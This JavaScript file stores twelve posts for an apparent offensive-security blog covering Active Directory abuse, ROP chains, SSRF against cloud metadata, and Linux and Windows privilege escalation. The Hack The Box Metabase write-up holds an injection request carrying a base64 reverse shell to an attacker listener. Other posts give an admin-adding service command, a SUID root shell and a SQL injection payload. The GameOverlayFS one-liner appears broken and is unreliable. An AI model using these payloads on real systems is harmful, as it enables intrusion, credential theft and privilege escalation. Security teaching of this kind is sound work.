/**
 * Blog Writeups & Research database
 */
const POSTS_DATA = {
    "1": {
        title: "Abusing Kerberos Delegation: Constrained and Unconstrained",
        date: "May 24, 2026",
        readTime: "8 min read",
        category: "active-directory",
        tags: ["Active Directory", "Kerberos", "Red Teaming"],
        summary: "A deep dive into how delegation works in Active Directory environments and step-by-step payloads to exploit delegation misconfigurations for domain privilege escalation.",
        content: `
            <p>Active Directory delegation is an extremely powerful feature that allows a service account or computer account to impersonate another user to access resources on their behalf. However, when configured insecurely, delegation becomes one of the most common vectors for domain compromise.</p>
            
            <h3>1. Unconstrained Delegation</h3>
            <p>When an account is configured with <strong>Unconstrained Delegation</strong>, any time a user authenticates to that service, the Domain Controller puts a copy of that user's Ticket Granting Ticket (TGT) into the service's memory (inside the LSASS process). If a red teamer compromises a server with Unconstrained Delegation enabled, they can extract those TGTs and impersonate the users.</p>
            <blockquote>
                <p><strong>Note:</strong> If you can coerce a Domain Controller (e.g. using the Printer Bug or PetitPotam) to authenticate to your compromised host running Unconstrained Delegation, you can harvest the Domain Controller's computer account TGT and execute a DCSync attack.</p>
            </blockquote>
            <p>To list accounts with Unconstrained Delegation via PowerView:</p>
            <pre><code class="language-powershell">Get-DomainComputer -Unconstrained -Properties name, dnshostname</code></pre>
            <p>Once compromised, you can use Mimikatz to export the tickets:</p>
            <pre><code class="language-powershell">sekurlsa::tickets /export</code></pre>

            <h3>2. Constrained Delegation</h3>
            <p>Constrained Delegation restricts the impersonation to specific services. It relies on two Kerberos extensions: <strong>S4U2self</strong> (Service for User to Self) and <strong>S4U2proxy</strong> (Service for User to Proxy). If an attacker compromises an account configured with Constrained Delegation (possesses its password/hash), they can request a service ticket for <em>any</em> user (like Domain Admin) to themselves, and then proxy that ticket to the delegated target service.</p>
            <p>We can exploit this using Rubeus:</p>
            <pre><code class="language-powershell">Rubeus.exe s4u /user:compromised_svc /rc4:HASH /impersonateuser:Administrator /msdsspn:time/target-dc.domain.local /altservice:cifs /ptt</code></pre>
            <p>This requests a ticket for the <code>Administrator</code> to access the <code>cifs</code> service on the target DC and injects it into memory (Pass-the-Ticket).</p>
            
            <h3>3. Remediation</h3>
            <p>To protect against delegation abuse, administrators should:</p>
            <ul>
                <li>Avoid using Unconstrained Delegation entirely.</li>
                <li>Add high-privilege accounts (like Domain Admins) to the "Account is sensitive and cannot be delegated" group.</li>
                <li>Implement Protected Users group membership.</li>
                <li>Prefer Resource-Based Constrained Delegation (RBCD) which puts control on the target resource rather than the delegating account.</li>
            </ul>
        `
    },
    "2": {
        title: "Bypassing DEP/ASLR with ROP Chains on x86 Windows",
        date: "April 12, 2026",
        readTime: "12 min read",
        category: "exploit-dev",
        tags: ["Exploit Dev", "x86 Assembly", "Bypass"],
        summary: "Explaining how to construct Return-Oriented Programming (ROP) chains to execute shellcode by pivoting stacks and calling VirtualProtect to bypass exploit mitigation mechanisms.",
        content: `
            <p>Modern operating systems implement security mitigations to prevent buffer overflow vulnerabilities from turning into arbitrary code execution. The two most critical mitigations are <strong>DEP</strong> (Data Execution Prevention / NX bit) and <strong>ASLR</strong> (Address Space Layout Randomization).</p>
            
            <h3>1. Understanding DEP and ASLR</h3>
            <p><strong>DEP:</strong> Marks memory regions (like the stack and heap) as non-executable. If execution redirects to shellcode placed on the stack, the CPU throws an access violation.</p>
            <p><strong>ASLR:</strong> Randomizes the base addresses of executables and DLLs in memory on boot. This prevents hardcoding addresses of functions or shellcode.</p>

            <h3>2. Bypassing with Return-Oriented Programming (ROP)</h3>
            <p>To bypass DEP, we must redirect execution to existing executable code in memory. Instead of executing code on the stack, we locate instructions in legitimate loaded DLLs that end with a <code>RET</code> instruction. These are called <strong>gadgets</strong>. By chaining the addresses of these gadgets together on the stack, we can manipulate CPU registers to call Windows APIs like <code>VirtualProtect</code> or <code>VirtualAlloc</code> to make our stack region executable, then jump to our shellcode.</p>
            
            <h3>3. Constructing the VirtualProtect ROP Chain</h3>
            <p>To call <code>VirtualProtect</code>, we need to set up the stack or registers with the following arguments:</p>
            <ul>
                <li><code>lpAddress</code>: Base address of the memory region to change (our stack shellcode address).</li>
                <li><code>dwSize</code>: Size of the region (e.g. 0x201).</li>
                <li><code>flNewProtect</code>: New protection constant (0x40 = PAGE_EXECUTE_READWRITE).</li>
                <li><code>lpflOldProtect</code>: A valid pointer in memory to write the old protection flags to.</li>
            </ul>
            <p>Here is a snippet of a ROP chain generated in Python to setup registers and execute <code>VirtualProtect</code> via a pushad gadget:</p>
            <pre><code class="language-python"># ROP gadgets found in non-ASLR/DEP compiled DLL (e.g., vulnerable application DLL)
rop_gadgets = [
    # Set EBP to pointer to VirtualProtect
    0x10012543, # POP EBP # RET
    0x1002af04, # Address of VirtualProtect pointer
    # Set EBX to dwSize
    0x1001ff21, # POP EBX # RET
    0x00000201, # Size parameter
    # Set EDX to flNewProtect (0x40)
    0x10015502, # POP EDX # RET
    0x00000040, # PAGE_EXECUTE_READWRITE
    # Set ECX to writable pointer for lpflOldProtect
    0x10011409, # POP ECX # RET
    0x1003f000, # Writable location in data section
    # Set EAX to NOP (for clean return)
    0x10012211, # POP EAX # RET
    0x90909090, # NOP
    # Push registers and call VirtualProtect
    0x100234a1, # PUSHAD # RET
]</code></pre>
            <p>The <code>PUSHAD</code> instruction pushes all registers (EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI) onto the stack, constructing a perfect function call stack layout in memory, allowing us to pivot stack execution directly into execution space.</p>
        `
    },
    "3": {
        title: "Exploiting SSRF in Cloud Environments: AWS metadata v1 to v2",
        date: "March 08, 2026",
        readTime: "6 min read",
        category: "web-sec",
        tags: ["Web Security", "SSRF", "Cloud Security"],
        summary: "Analyzing a Server-Side Request Forgery vulnerability, retrieving instance credentials via IMDSv1, and looking into bypass strategies required for IMDSv2 protections.",
        content: `
            <p>Server-Side Request Forgery (SSRF) allows an attacker to force a server-side application to make HTTP requests to arbitrary domains. In cloud environments (AWS, GCP, Azure), SSRF is highly critical because attackers can query internal metadata endpoints to retrieve IAM credentials.</p>
            
            <h3>1. The Classic AWS Instance Metadata Service (IMDSv1)</h3>
            <p>By default, AWS instances run a metadata service listening on the local link-local address: <code>http://169.254.169.254</code>. In IMDSv1, requesting credentials is a simple GET request. If an application is vulnerable to SSRF, an attacker can input:</p>
            <pre><code class="language-http">http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role</code></pre>
            <p>The server makes the request and returns the AWS Access Key, Secret Key, and Token directly back to the attacker, leading to full cloud instance account compromise.</p>

            <h3>2. The Defense: IMDSv2 Bypass and Limitations</h3>
            <p>To mitigate this, AWS introduced <strong>IMDSv2</strong>. It requires a session-oriented flow utilizing a HTTP PUT header to fetch a token first, before allowing GET requests:</p>
            <pre><code class="language-http"># Step 1: Request token
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Use token in GET request
GET /latest/meta-data/iam/security-credentials/admin-role HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: [TOKEN_STRING]</code></pre>
            
            <p>This effectively kills simple GET-based SSRF exploits (like URL input parameters) since the attacker cannot force the vulnerable server to perform a PUT request with custom headers.</p>
            
            <h3>3. How IMDSv2 Can Still Be Exploited</h3>
            <p>While IMDSv2 is highly secure, it can still be bypassed in specific scenarios:</p>
            <ul>
                <li><strong>Local File Inclusion (LFI):</strong> If you have an LFI vulnerability or can execute local code, you can fetch the token locally.</li>
                <li><strong>Open Proxies / Nginx Misconfigurations:</strong> If Nginx is acting as a reverse proxy and allows headers to pass through, header injection or configuration slip-ups can allow header manipulation.</li>
                <li><strong>SSRF + HTTP Header Injection (CRLF):</strong> If the SSRF vulnerability allows inputting newline characters (<code>\\r\\n</code>), an attacker can inject the <code>X-aws-ec2-metadata-token</code> header into the request stream.</li>
            </ul>
        `
    },
    "4": {
        title: "HTB 'Analytics' Writeup: CVE-2023-38646 Pre-Auth RCE",
        date: "Feb 15, 2026",
        readTime: "5 min read",
        category: "ctf",
        tags: ["CTFs", "Hack The Box", "RCE"],
        summary: "Explaining step-by-step compromise of the Metabase application via CVE-2023-38646, establishing a foothold, and performing privilege escalation via GameOverlayFS vulnerability.",
        content: `
            <p>This writeup documents the exploitation of the Hack The Box machine <strong>Analytics</strong>, which showcases a critical pre-authentication remote code execution (RCE) vulnerability in Metabase, followed by a local kernel privilege escalation.</p>
            
            <h3>1. Enumeration</h3>
            <p>An Nmap scan reveals ports 22 (SSH) and 80 (HTTP) open. The web server redirects to <code>analytical.htb</code>. Checking the site, we see a Metabase dashboard page. We find the Metabase API endpoints are accessible. Checking <code>/api/session/properties</code>, we look for setup tokens:</p>
            <pre><code class="language-json">{"setup-token": "249872e7-2b3a-484d-ad02-8646039a04ff", ...}</code></pre>
            <p>The setup token is present! When the setup token is exposed, we can trigger the setup process even if the application is already initialized, exploiting CVE-2023-38646.</p>

            <h3>2. Exploiting Metabase (CVE-2023-38646)</h3>
            <p>The vulnerability exists in the database connection validation endpoint, which allows injecting shell commands into the H2 database connection string parameter. We send a POST request to <code>/api/setup/validate</code>:</p>
            <pre><code class="language-http">POST /api/setup/validate HTTP/1.1
Host: analytical.htb
Content-Type: application/json

{
  "token": "249872e7-2b3a-484d-ad02-8646039a04ff",
  "details": {
    "is_on_demand": false,
    "details": {
      "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER delay BEFORE SELECT ON INFORMATION_SCHEMA.USERS AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash}');\\n$$",
      "type": "h2"
    },
    "name": "an-exploit-db",
    "engine": "h2"
  }
}</code></pre>
            <p>We base64-encoded our reverse shell payload to bypass special character filters. After sending the request, we immediately receive a shell on our Netcat listener!</p>
            
            <h3>3. Privilege Escalation</h3>
            <p>Inside the docker container, we enumerate the environment and find credentials in the environment variables (<code>META_USER=metalman</code>, <code>META_PASS=An4lyt1cs_Pr0d_2023</code>). We SSH into the host OS using these credentials.</p>
            <p>Checking the host OS kernel version via <code>uname -r</code>:</p>
            <pre><code class="language-bash">6.2.0-25-generic</code></pre>
            <p>This kernel is vulnerable to the **GameOverlayFS** privilege escalation (CVE-2023-2640 and CVE-2023-32629). We run a simple one-liner exploit exploit:</p>
            <pre><code class="language-bash">unshare -rm gt \
  bash -c "setcap cap_setuid+eip \$(which bash); exec bash"
./bash -p</code></pre>
            <p>We successfully elevate to <code>root</code> and read the flag!</p>
        `
    },
    "5": {
        title: "Pivoting through Windows Event Logs to find credentials",
        date: "Jan 12, 2026",
        readTime: "6 min read",
        category: "active-directory",
        tags: ["Active Directory", "Logs", "Pivoting"],
        summary: "Analyzing Windows Event Logs (4624, 4625) to spot credential leakage in command line parameters and scripting automation to extract them.",
        content: `
            <p>Windows Event Logs are a goldmine for defenders, but also for attackers. If administrators run commands that contain passwords in cleartext (e.g. <code>net use</code>, <code>runas</code>), these arguments are recorded in Event ID 4688 (Process Creation) or PowerShell Event ID 4104. By querying these logs, we can pivot and escalate privilege.</p>
            <h3>1. Finding Sensitive Commands</h3>
            <p>We can query process creation events via PowerShell to find cleartext passwords:</p>
            <pre><code class="language-powershell">Get-WinEvent -FilterHashtable @{LogName='Security';ID=4688} | Where-Object {$_.Message -like "*password*" -or $_.Message -like "*net use*"}</code></pre>
            <h3>2. Exploitation</h3>
            <p>Once we identify credentials leaked in a cmdline parameter, we can reuse them to authenticate across the domain or pivot to a higher privilege service account.</p>
        `
    },
    "6": {
        title: "Process Injection: DLL Injection vs Process Hollowing",
        date: "Dec 05, 2025",
        readTime: "9 min read",
        category: "exploit-dev",
        tags: ["Exploit Dev", "Injection", "Bypass"],
        summary: "A comparison between classic DLL Injection using CreateRemoteThread and Process Hollowing using NtUnmapViewOfSection for AV evasion.",
        content: `
            <p>Process injection is a method of executing shellcode inside the address space of a separate live process. This evades discovery since the executing thread runs under a legitimate name (like <code>svchost.exe</code> or <code>explorer.exe</code>).</p>
            <h3>1. DLL Injection</h3>
            <p>Classic DLL injection forces a target process to load our malicious DLL via <code>LoadLibraryA</code>. It uses the following flow:</p>
            <ul>
                <li>Open target process (<code>OpenProcess</code>)</li>
                <li>Allocate space for the DLL path string (<code>VirtualAllocEx</code>)</li>
                <li>Write the path to target space (<code>WriteProcessMemory</code>)</li>
                <li>Call <code>CreateRemoteThread</code> passing the address of <code>LoadLibraryA</code> and the string pointer</li>
            </ul>
            <h3>2. Process Hollowing</h3>
            <p>Process Hollowing creates a suspended process, unmaps (hollows) its executable memory, replaces it with our malicious PE structure, and resumes the thread. This is harder to detect than DLL injection since no suspicious DLLs are loaded from disk.</p>
        `
    },
    "7": {
        title: "Blind SQL Injection via conditional time delays",
        date: "Nov 20, 2025",
        readTime: "7 min read",
        category: "web-sec",
        tags: ["Web Security", "SQLi", "Automation"],
        summary: "Developing a custom Python exploit script to perform blind SQL injection by monitoring response times and extracting database hashes.",
        content: `
            <p>When web applications do not output database query results or error logs directly, we can use conditional time delays (like <code>pg_sleep</code> or <code>dbms_lock.sleep</code>) to query information bit-by-bit.</p>
            <h3>1. Exploit Strategy</h3>
            <p>We test character by character using queries like:</p>
            <pre><code class="language-sql">' UNION SELECT IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) FROM users--</code></pre>
            <p>If the response takes 5 seconds, we know the first character is 'a'. We can automate this in Python using the <code>requests</code> library to query ascii values recursively.</p>
        `
    },
    "8": {
        title: "Local Privilege Escalation via Weak Service Permissions",
        date: "Oct 18, 2025",
        readTime: "6 min read",
        category: "active-directory",
        tags: ["Windows", "PrivEsc", "Services"],
        summary: "Exploiting weak binpath configurations and service file permissions in Windows environments using Accesschk and custom service binaries.",
        content: `
            <p>If a service executable has weak write permissions, we can replace the binary with our own payload, restart the service, and execute commands under the SYSTEM integrity level.</p>
            <h3>1. Checking Service Permissions</h3>
            <p>Using sysinternals <code>accesschk.exe</code>:</p>
            <pre><code class="language-powershell">accesschk.exe -uwcqv "Authenticated Users" *</code></pre>
            <p>If we find a service (e.g. <code>VulnSvc</code>) where we have <code>SERVICE_ALL_ACCESS</code>, we can reconfigure the binpath to run arbitrary commands:</p>
            <pre><code class="language-powershell">sc config VulnSvc binpath= "net user localadmin password123 /add"
sc stop VulnSvc
sc start VulnSvc</code></pre>
        `
    },
    "9": {
        title: "Active Directory Enumeration using BloodHound",
        date: "Sept 10, 2025",
        readTime: "8 min read",
        category: "active-directory",
        tags: ["Active Directory", "BloodHound", "Enumeration"],
        summary: "How to use SharpHound collectors and BloodHound interface to map attack paths and identify transitive trust relationships in AD domains.",
        content: `
            <p>BloodHound uses graph theory to reveal hidden relationships and vulnerable links within an Active Directory network, highlighting paths that lead to Domain Admin credentials.</p>
            <h3>1. Collecting Data</h3>
            <p>We execute the SharpHound collector on a domain-joined machine:</p>
            <pre><code class="language-powershell">SharpHound.exe --CollectionMethods All</code></pre>
            <p>This generates a ZIP file containing JSON data mapping all group memberships, user sessions, trusts, and ACLs which can then be imported into BloodHound's Neo4j database GUI.</p>
        `
    },
    "10": {
        title: "PortSwigger CORS misconfigurations exploit writeup",
        date: "Aug 15, 2025",
        readTime: "5 min read",
        category: "web-sec",
        tags: ["Web Security", "CORS", "PortSwigger"],
        summary: "Analyzing Cross-Origin Resource Sharing (CORS) misconfigurations, abusing Access-Control-Allow-Credentials, and stealing sensitive user data.",
        content: `
            <p>CORS allows servers to share resources with specific origins. When configured insecurely, origins can be spoofed or wildcarded while supporting credentials, allowing cross-site credential theft.</p>
            <h3>1. Exploiting Origin Reflection</h3>
            <p>If a server mirrors the request's Origin header in the response <code>Access-Control-Allow-Origin</code>, and sets <code>Access-Control-Allow-Credentials: true</code>, we can host an exploit page that sends a fetch request to the vulnerable endpoint and retrieves sensitive API keys.</p>
        `
    },
    "11": {
        title: "Linux Privilege Escalation: Exploiting SUID binaries",
        date: "July 24, 2025",
        readTime: "5 min read",
        category: "ctf",
        tags: ["Linux", "SUID", "PrivEsc"],
        summary: "A guide on identifying binaries running with Setuid permissions, using GTFOBins, and hijacking environment variables to elevate shell privileges.",
        content: `
            <p>SUID permissions allow users to execute binaries with the permission of the owner. If system binaries (like find, nano, vim) have SUID flags, we can exploit them to spawn root shells.</p>
            <h3>1. Listing SUID Binaries</h3>
            <pre><code class="language-bash">find / -perm -u=s -type f 2>/dev/null</code></pre>
            <p>If <code>find</code> is compiled with SUID, we can execute commands under root using:</p>
            <pre><code class="language-bash">find . -exec /bin/sh -p \; -quit</code></pre>
        `
    },
    "12": {
        title: "Evasion 101: Obfuscating PowerShell scripts",
        date: "June 03, 2025",
        readTime: "8 min read",
        category: "exploit-dev",
        tags: ["Exploit Dev", "Bypass", "PowerShell"],
        summary: "Bypassing Antimalware Scan Interface (AMSI) signatures in PowerShell using key obfuscation, encoding, and string formatting techniques.",
        content: `
            <p>AMSI checks scripts for signatures before execution. By split-formatting triggers or loading payloads via reflective assembly calls, we can bypass static scan filters.</p>
            <h3>1. Classic AMSI Bypass</h3>
            <p>By memory patching <code>AmsiScanBuffer</code>, we can force it to return success (clean scan) for all subsequent commands. Obfuscated strings prevent AV engines from flagging the bypass script itself.</p>
        `
    }
};
